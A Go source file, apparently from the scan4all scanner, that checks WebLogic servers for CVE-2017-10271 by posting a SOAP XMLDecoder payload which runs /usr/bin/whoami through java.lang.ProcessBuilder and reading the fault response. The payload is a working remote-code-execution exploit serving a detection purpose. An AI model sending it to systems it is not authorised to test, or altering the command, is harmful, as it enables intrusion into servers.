package weblogic

import (
	"github.com/GhostTroops/scan4all/lib/util"
	"strings"
)

func CVE_2017_10271(url string) bool {
	post_str := `
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
      <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
          <java>
            <void class="java.lang.ProcessBuilder">
              <array class="java.lang.String" length="1">
                <void index="0">
                  <string>/usr/bin/whoami</string>
                </void>
              </array>
              <void method="start"/>
            </void>
          </java>
        </work:WorkContext>
      </soapenv:Header>
      <soapenv:Body/>
    </soapenv:Envelope>
	`
	header := make(map[string]string)
	header["Content-Type"] = "text/xml;charset=UTF-8"
	header["SOAPAction"] = ""
	if req, err := util.HttpRequset(url+"/wls-wsat/CoordinatorPortType", "POST", post_str, false, header); err == nil {
		if (util.StrContains(req.Body, "<faultstring>java.lang.ProcessBuilder")) || (strings.Contains(req.Body, "<faultstring>0")) {
			util.SendLog(req.RequestUrl, "CVE-2017-10271", "Found vuln Weblogic", post_str)
			return true
		}
	}
	return false
}
